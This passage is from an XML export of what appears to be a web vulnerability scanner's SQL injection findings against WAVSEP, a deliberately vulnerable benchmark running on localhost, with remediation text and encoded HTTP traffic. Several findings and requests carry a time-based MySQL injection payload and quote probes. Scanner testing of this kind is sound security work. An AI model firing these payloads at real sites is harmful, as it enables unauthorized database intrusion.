      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjQzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NTANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIFVSTC1lbmNvZGVkIHBheWxvYWQgKGluY2x1ZGluZyAnc3BlY2lhbCcgY2hhcmFjdGVycykuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uU3BlY2lhbFVSTEVuY29kZS1Vbmlvbk9iZnVzY2F0aW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtT2JmdXNjYXRpb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NTANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIFVSTC1lbmNvZGVkIHBheWxvYWQgKGluY2x1ZGluZyAnc3BlY2lhbCcgY2hhcmFjdGVycykuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9897882074857472</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case03-InjectionInSearch-RetrieveDatabaseVersionBypassWAF-UnionObfuscationExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case03-InjectionInSearch-RetrieveDatabaseVersionBypassWAF-UnionObfuscationExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAzLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uQnlwYXNzV0FGLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtT2JmdXNjYXRpb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowNDoyMiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAzLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uQnlwYXNzV0FGLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULU9iZnVzY2F0aW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCB0byBieXBhc3MgV0FGIChlLmcuIEhFWCBlbmNvZGUpLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvQ2FzZTAzLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uQnlwYXNzV0FGLVVuaW9uT2JmdXNjYXRpb25FeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1PYmZ1c2NhdGlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIHRoZSBkYXRhYmFzZSB2ZXJzaW9uIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCB0byBieXBhc3MgV0FGIChlLmcuIEhFWCBlbmNvZGUpLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8644272743903337472</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case04-InjectionInSearch-RetrieveDatabaseVersionInlineComments-UnionObfuscationExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case04-InjectionInSearch-RetrieveDatabaseVersionInlineComments-UnionObfuscationExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
